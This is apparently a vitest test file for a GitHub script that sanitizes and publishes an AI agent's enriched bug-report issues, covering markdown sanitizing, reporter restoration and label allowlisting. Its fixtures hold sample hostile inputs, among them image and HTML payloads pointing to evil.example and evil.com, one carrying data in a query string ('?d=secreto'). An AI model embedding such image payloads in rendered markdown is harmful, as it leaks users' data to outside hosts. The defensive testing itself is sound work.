import { mkdtempSync, mkdirSync, readFileSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { describe, expect, it, vi } from 'vitest'

import {
  composeEnrichedBody,
  MAX_BODY_BYTES,
  parseLabelChanges,
  planLabelChanges,
  publishReport,
  sanitizeMarkdown,
} from '../../.github/scripts/publish-web-report.mjs'
import { parseReporterId } from '../../scripts/lib/reports-backfill-plan'

const REPO = 'org/repo'
const ATTACHMENT = 'https://github.com/user-attachments/assets/captura'
const ORIGINAL_BODY = [
  '## Reporte desde la web',
  '',
  '### Resumen',
  'El filtro no persiste.',
  '',
  '### Adjuntos',
  `![captura](${ATTACHMENT})`,
  '',
  '### Contexto de ejecución',
  '- Ruta: /movimientos',
  '',
  '### Reportero',
  '- Nombre: Ana',
  '- Email: ana@example.com',
  '- Identificador: user-1',
].join('\n')

function workspace() {
  const root = mkdtempSync(join(tmpdir(), 'publish-web-report-'))
  mkdirSync(join(root, 'enricher'), { recursive: true })
  return { root, enricher: join(root, 'enricher') }
}

function writeOriginal(root: string, body = ORIGINAL_BODY): string {
  const file = join(root, 'original-body.md')
  writeFileSync(file, body)
  return file
}

function fakeGithub(
  options: {
    body?: string
    labels?: string[]
    existing?: string[]
  } = {},
) {
  const calls: string[][] = []
  const existing = options.existing ?? ['feature', 'ready-for-agent', 'needs-triage']
  const gh = vi.fn((args: string[]) => {
    calls.push(args)
    if (args[0] === 'issue' && args[1] === 'view') {
      return JSON.stringify({
        body: options.body ?? ORIGINAL_BODY,
        labels: (options.labels ?? ['needs-triage', 'source:web-report']).map((name) => ({ name })),
      })
    }
    if (args[0] === 'label' && args[1] === 'list') {
      return JSON.stringify(existing.map((name) => ({ name })))
    }
    return ''
  })
  return { gh, calls }
}

function expectNoActiveMarkup(text: string, allowed: string[] = []): void {
  let withoutAllowed = text
  for (const snippet of allowed) withoutAllowed = withoutAllowed.split(snippet).join('')
  expect(withoutAllowed).not.toContain('![')
  expect(withoutAllowed).not.toMatch(/<[A-Za-z/!]/)
}

describe('composeEnrichedBody', () => {
  it('añade el Reportero auténtico, conserva adjuntos/contexto y quita el inyectado', () => {
    const body = [
      '## Descripción',
      '',
      'Texto enriquecido.',
      '',
      '### Reportero',
      '- Email: inyectado@example.com',
      '- Identificador: falso',
    ].join('\n')

    const composed = composeEnrichedBody(body, ORIGINAL_BODY)

    expect(composed).toContain('Texto enriquecido.')
    expect(composed).toContain(`![captura](${ATTACHMENT})`)
    expect(composed).toContain('### Contexto de ejecución')
    expect(composed).toContain('- Identificador: user-1')
    expect(composed).not.toContain('inyectado@example.com')
    expect(composed).not.toContain('Identificador: falso')
    expect(composed.match(/^### Reportero$/gm)).toHaveLength(1)
  })

  it('no duplica adjuntos ni contexto que el agente ya conservó', () => {
    const body = [
      '## Descripción',
      '',
      'Texto.',
      '',
      '### Adjuntos',
      `![captura](${ATTACHMENT})`,
      '',
      '### Contexto de ejecución',
      '- Ruta: /movimientos',
    ].join('\n')

    const composed = composeEnrichedBody(body, ORIGINAL_BODY)

    expect(composed.match(/^### Adjuntos$/gm)).toHaveLength(1)
    expect(composed.match(/^### Contexto de ejecución$/gm)).toHaveLength(1)
    expect(composed.match(new RegExp(ATTACHMENT, 'g'))).toHaveLength(1)
  })

  it('añade las imágenes que falten aunque el agente conserve otras', () => {
    const body = [
      '## Descripción',
      '',
      'Texto.',
      '',
      '### Adjuntos',
      '![otra](https://github.com/user-attachments/assets/otra)',
    ].join('\n')

    const composed = composeEnrichedBody(body, ORIGINAL_BODY)

    expect(composed).toContain('### Adjuntos')
    expect(composed).toContain('assets/otra')
    expect(composed).toContain('assets/captura')
  })

  it('usa el último bloque Reportero, como el backfill', () => {
    const original = [
      '### Reportero',
      '- Identificador: falso',
      '',
      '### Reportero',
      '- Identificador: real',
    ].join('\n')

    const composed = composeEnrichedBody('## Descripción\n\nTexto.', original)

    expect(composed).toContain('Identificador: real')
    expect(composed).not.toContain('Identificador: falso')
    expect(composed.match(/^### Reportero$/gm)).toHaveLength(1)
  })

  it('conserva el marcador histórico si existe en el cuerpo original', () => {
    const original = ['<!-- web-report-enriched -->', '', ORIGINAL_BODY].join('\n')
    const composed = composeEnrichedBody('## Descripción\n\nTexto.', original)
    expect(composed.startsWith('<!-- web-report-enriched -->')).toBe(true)
  })

  it('el cuerpo compuesto sigue siendo válido para el backfill de #340', () => {
    const body = [
      '## Descripción',
      '',
      'Texto.',
      '',
      '### Reportero',
      '- Identificador: falso',
    ].join('\n')

    const composed = composeEnrichedBody(body, ORIGINAL_BODY)

    expect(parseReporterId(composed)).toEqual({ ok: true, userId: 'user-1' })
  })
})

describe('sanitizeMarkdown', () => {
  it('escapa imágenes externas y conserva los enlaces normales', () => {
    const text = [
      '![externa](https://evil.example/a.png)',
      '[enlace](https://evil.example/path)',
      'texto https://evil.example/suelto',
      '![referencia][img]',
      '  [img]: https://evil.example/ref.png',
    ].join('\n')

    const sanitized = sanitizeMarkdown(text, { originalBody: ORIGINAL_BODY })

    expect(sanitized).toContain('!\u200b[externa](https://evil.example/a.png)')
    expect(sanitized).toContain('[enlace](https://evil.example/path)')
    expect(sanitized).toContain('https://evil.example/suelto')
    expect(sanitized).toContain('!\u200b[referencia][img]')
    expect(sanitized).toContain('[img]: https://evil.example/ref.png')
    expectNoActiveMarkup(sanitized)
  })

  it.each([
    ['blockquote', '> [x]: HTTPS://evil.com/a'],
    ['lista', '- [x]: HTTPS://evil.com/a'],
    ['entidad', '> [x]: &#104;ttps://evil.com/a'],
  ])('escapa la referencia con definición en %s', (_name, definition) => {
    const sanitized = sanitizeMarkdown(`${definition}\n\n![i][x]`, { originalBody: '' })

    expect(sanitized).toContain(definition)
    expect(sanitized).toContain('!\u200b[i][x]')
    expectNoActiveMarkup(sanitized)
  })

  it.each([
    ['inline que cruza párrafos', '`\n\n![x](https://evil.com/a)\n\n`'],
    ['cierre de distinta longitud', '` ![x](https://evil.com/a) ``'],
    ['fence indentado', '    ```\n![x](https://evil.com/a)\n```'],
    [
      'fence en blockquote/list',
      '> ```\n\n![x](https://evil.com/a)\n\n```\n\n- ```\n\n<img src="https://evil.com/x">\n\n```',
    ],
    ['fence con backtick en info', '```a`b\n![x](https://evil.com/a)\n```'],
  ])('escapa imágenes y HTML también en %s', (_name, text) => {
    const sanitized = sanitizeMarkdown(text, { originalBody: '' })

    expect(sanitized).toContain('!\u200b[')
    expect(sanitized).not.toContain('<img')
    expectNoActiveMarkup(sanitized)
  })

  it('reinserta solo imágenes inline permitidas y nunca referencias del original', () => {
    const ownAsset = 'https://github.com/org/repo/assets/123'
    const original = [
      '### Adjuntos',
      `![captura](${ATTACHMENT})`,
      `![propia](${ownAsset})`,
      '![externa](https://evil.example/original.png)',
      '![referencia][x]',
    ].join('\n')
    const text = [
      `![captura](${ATTACHMENT})`,
      `![propia](${ownAsset})`,
      '![externa](https://evil.example/original.png)',
      '![otra](https://evil.example/other.png)',
      '![referencia][x]',
      '<img src="https://evil.example/x.png">',
      '<picture><source srcset="https://evil.example/x"><img src="https://evil.example/y"></picture>',
    ].join('\n')

    const sanitized = sanitizeMarkdown(text, { originalBody: original, repository: REPO })

    expect(sanitized).toContain(`![captura](${ATTACHMENT})`)
    expect(sanitized).toContain(`![propia](${ownAsset})`)
    expect(sanitized).toContain('!\u200b[externa](https://evil.example/original.png)')
    expect(sanitized).toContain('!\u200b[otra](https://evil.example/other.png)')
    expect(sanitized).toContain('!\u200b[referencia][x]')
    expect(sanitized).not.toContain('<img')
    expect(sanitized).not.toContain('<picture')
    expectNoActiveMarkup(sanitized, [`![captura](${ATTACHMENT})`, `![propia](${ownAsset})`])
  })

  it('no reinserta una imagen de referencia original aunque el agente añada su definición', () => {
    const original = '### Adjuntos\n![i][x]'
    const text = '![i][x]\n\n[x]: HTTPS://evil.com/?d=secreto'

    const sanitized = sanitizeMarkdown(text, { originalBody: original, repository: REPO })

    expect(sanitized).toContain('!\u200b[i][x]')
    expect(sanitized).toContain('[x]: HTTPS://evil.com/?d=secreto')
    expectNoActiveMarkup(sanitized)
  })

  it('escapa imágenes y HTML dentro de código pero mantiene las menciones y el texto legibles', () => {
    const text = [
      '```md',
      '![x](https://evil.example/a.png)',
      '<img src="https://evil.example/x.png">',
      '@types/node @smoke',
      '```',
      '',
      '`![y](https://evil.example/b.png) <tag> @types/node`',
    ].join('\n')

    const sanitized = sanitizeMarkdown(text, { originalBody: '' })

    expect(sanitized).toContain('!\u200b[x](https://evil.example/a.png)')
    expect(sanitized).toContain('<\u200bimg src="https://evil.example/x.png">')
    expect(sanitized).toContain('@types/node @smoke')
    expect(sanitized).toContain('`!\u200b[y](https://evil.example/b.png) <\u200btag> @types/node`')
    expect(sanitized.replaceAll('\u200b', '')).toContain('![x](https://evil.example/a.png)')
    expectNoActiveMarkup(sanitized)
  })

  it('neutraliza menciones en texto, incluido /@usuario, y respeta correos y URLs', () => {
    const text = [
      'Hola @ana y @org/team',
      'Mira /@usuario',
      'ana@example.com',
      '[local](http://localhost:4321/x)',
      'https://github.com/org/repo/issues/1',
    ].join('\n')

    const sanitized = sanitizeMarkdown(text, { originalBody: '' })

    expect(sanitized).toContain('@\u200bana')
    expect(sanitized).toContain('@\u200borg')
    expect(sanitized).toContain('/@\u200busuario')
    expect(sanitized).toContain('ana@example.com')
    expect(sanitized).toContain('[local](http://localhost:4321/x)')
    expect(sanitized).toContain('https://github.com/org/repo/issues/1')
    expectNoActiveMarkup(sanitized)
  })

  it('muestra <details> y <https://...> como texto', () => {
    const text = '<details><summary>x</summary> <https://evil.example>'
    const sanitized = sanitizeMarkdown(text, { originalBody: '' })

    expect(sanitized).toContain('<\u200bdetails>')
    expect(sanitized).toContain('<\u200bhttps://evil.example>')
    expectNoActiveMarkup(sanitized)
  })
})

describe('parseLabelChanges y planLabelChanges', () => {
  it('separa altas y bajas', () => {
    expect(parseLabelChanges('feature\n-ready-for-agent\n\nneeds-triage\n')).toEqual({
      add: ['feature', 'needs-triage'],
      remove: ['ready-for-agent'],
    })
  })

  it('rechaza más de 50 labels', () => {
    expect(() =>
      parseLabelChanges(Array.from({ length: 51 }, (_, i) => `label-${i}`).join('\n')),
    ).toThrow('50')
  })

  it('solo acepta la allowlist y sustituye el estado de triage anterior', () => {
    expect(
      planLabelChanges({
        changes: { add: ['ready-for-agent', 'source:web-report'], remove: [] },
        current: ['needs-triage', 'source:web-report'],
        existing: ['ready-for-agent', 'needs-triage', 'source:web-report'],
      }),
    ).toEqual({
      added: ['ready-for-agent'],
      removed: ['needs-triage'],
      rejected: ['source:web-report'],
    })
  })

  it('sustituye el tipo anterior y respeta las bajas explícitas', () => {
    expect(
      planLabelChanges({
        changes: { add: ['feature'], remove: ['needs-info'] },
        current: ['bug', 'needs-triage', 'needs-info'],
        existing: ['feature', 'bug', 'needs-info'],
      }),
    ).toEqual({
      added: ['feature'],
      removed: ['needs-info', 'bug'],
      rejected: [],
    })
  })

  it('rechaza labels desconocidos y bajas que no están en la issue', () => {
    expect(
      planLabelChanges({
        changes: { add: ['P1'], remove: ['wontfix'] },
        current: ['needs-triage'],
        existing: ['P1', 'wontfix'],
      }),
    ).toEqual({ added: [], removed: [], rejected: ['P1', 'wontfix'] })
  })
})

describe('publicación de los ficheros del agente', () => {
  it('publica body saneado, comment saneado y solo los labels permitidos', () => {
    const { root, enricher } = workspace()
    const originalBodyPath = writeOriginal(root)
    const bodyFile = join(enricher, 'body.md')
    writeFileSync(
      bodyFile,
      [
        '## Descripción',
        '',
        'Cuerpo enriquecido.',
        '![externa](https://evil.example/a.png)',
        'hola @ana',
        '',
        '### Reportero',
        '- Email: inyectado@example.com',
      ].join('\n'),
    )
    const commentFile = join(enricher, 'comment.md')
    writeFileSync(commentFile, '## Agent Brief\n\n- [ ] Criterio.\n\n@ana')
    writeFileSync(
      join(enricher, 'labels.txt'),
      'feature\nready-for-agent\nmissing\n-source:web-report\n',
    )
    const { gh, calls } = fakeGithub()

    const result = publishReport({
      repository: REPO,
      issueNumber: 12,
      root: enricher,
      originalBodyPath,
      gh,
    })

    expect(result).toEqual({
      body: true,
      comment: true,
      bodyAsComment: false,
      labels: ['feature', 'ready-for-agent'],
      removed: ['needs-triage'],
      rejected: ['missing', 'source:web-report'],
    })
    expect(calls).toEqual([
      ['issue', 'view', '12', '--repo', REPO, '--json', 'body,labels'],
      ['label', 'list', '--repo', REPO, '--limit', '1000', '--json', 'name'],
      ['issue', 'edit', '12', '--repo', REPO, '--body-file', bodyFile],
      ['issue', 'comment', '12', '--repo', REPO, '--body-file', commentFile],
      [
        'issue',
        'edit',
        '12',
        '--repo',
        REPO,
        '--add-label',
        'feature',
        '--add-label',
        'ready-for-agent',
        '--remove-label',
        'needs-triage',
      ],
    ])

    const publishedBody = readFileSync(bodyFile, 'utf8')
    expect(publishedBody).toContain('- Identificador: user-1')
    expect(publishedBody).toContain(ATTACHMENT)
    expect(publishedBody).toContain('!\u200b[externa](https://evil.example/a.png)')
    expect(publishedBody).not.toContain('inyectado@example.com')
    expect(publishedBody).toContain('@\u200bana')
    expect(publishedBody.match(/^### Reportero$/gm)).toHaveLength(1)
    expectNoActiveMarkup(publishedBody, [`![captura](${ATTACHMENT})`])

    const publishedComment = readFileSync(commentFile, 'utf8')
    expect(publishedComment).toContain('@\u200bana')
  })

  it('si el cuerpo cambió lo publica como comentario y no lo sobrescribe', () => {
    const { root, enricher } = workspace()
    const originalBodyPath = writeOriginal(root)
    const bodyFile = join(enricher, 'body.md')
    writeFileSync(bodyFile, '## Descripción\n\nTexto nuevo.')
    const warn = vi.spyOn(console, 'warn').mockImplementation(() => {})
    const { gh, calls } = fakeGithub({ body: 'Editado por la persona' })

    const result = publishReport({
      repository: REPO,
      issueNumber: 12,
      root: enricher,
      originalBodyPath,
      gh,
    })

    expect(result.bodyAsComment).toBe(true)
    expect(
      calls.some(
        (args) => args[0] === 'issue' && args[1] === 'edit' && args.includes('--body-file'),
      ),
    ).toBe(false)
    expect(
      calls.some(
        (args) => args[0] === 'issue' && args[1] === 'comment' && args.includes('--body-file'),
      ),
    ).toBe(true)
    expect(warn).toHaveBeenCalledWith(expect.stringContaining('cuerpo cambió'))
    warn.mockRestore()
  })

  it('no considera cambiado el cuerpo por un salto de línea final', () => {
    const { root, enricher } = workspace()
    const originalBodyPath = writeOriginal(root, `${ORIGINAL_BODY}\n`)
    const bodyFile = join(enricher, 'body.md')
    writeFileSync(bodyFile, '## Descripción\n\nTexto.')
    const { gh, calls } = fakeGithub()

    const result = publishReport({
      repository: REPO,
      issueNumber: 12,
      root: enricher,
      originalBodyPath,
      gh,
    })

    expect(result.bodyAsComment).toBe(false)
    expect(
      calls.some(
        (args) => args[0] === 'issue' && args[1] === 'edit' && args.includes('--body-file'),
      ),
    ).toBe(true)
  })

  it('permite quitar un label sin añadir ninguno', () => {
    const { enricher } = workspace()
    writeFileSync(join(enricher, 'labels.txt'), '-needs-triage\n')
    const { gh, calls } = fakeGithub()

    expect(publishReport({ repository: REPO, issueNumber: 12, root: enricher, gh })).toMatchObject({
      labels: [],
      removed: ['needs-triage'],
    })
    expect(calls).toEqual([
      ['issue', 'view', '12', '--repo', REPO, '--json', 'body,labels'],
      ['issue', 'edit', '12', '--repo', REPO, '--remove-label', 'needs-triage'],
    ])
  })

  it('no llama a gh si no hay ficheros', () => {
    const { enricher } = workspace()
    const gh = vi.fn()
    expect(publishReport({ repository: REPO, issueNumber: 12, root: enricher, gh })).toEqual({
      body: false,
      comment: false,
      bodyAsComment: false,
      labels: [],
      removed: [],
      rejected: [],
    })
    expect(gh).not.toHaveBeenCalled()
  })

  it('falla si hay body.md pero no cuerpo original', () => {
    const { enricher } = workspace()
    writeFileSync(join(enricher, 'body.md'), '## Descripción\n\nTexto.')
    const gh = vi.fn()
    expect(() => publishReport({ repository: REPO, issueNumber: 12, root: enricher, gh })).toThrow(
      'cuerpo original',
    )
    expect(gh).not.toHaveBeenCalled()
  })

  it('rechaza un body demasiado grande antes de publicar', () => {
    const { enricher } = workspace()
    writeFileSync(join(enricher, 'body.md'), 'a'.repeat(MAX_BODY_BYTES + 1))
    const gh = vi.fn()
    expect(() => publishReport({ repository: REPO, issueNumber: 12, root: enricher, gh })).toThrow(
      'supera',
    )
    expect(gh).not.toHaveBeenCalled()
  })

  it('no publica labels si todos se rechazan', () => {
    const { enricher } = workspace()
    writeFileSync(join(enricher, 'labels.txt'), 'missing\nbad;label\n')
    const { gh, calls } = fakeGithub()

    expect(publishReport({ repository: REPO, issueNumber: 12, root: enricher, gh })).toMatchObject({
      labels: [],
      removed: [],
      rejected: ['missing', 'bad;label'],
    })
    expect(calls).toEqual([
      ['issue', 'view', '12', '--repo', REPO, '--json', 'body,labels'],
      ['label', 'list', '--repo', REPO, '--limit', '1000', '--json', 'name'],
    ])
  })
})
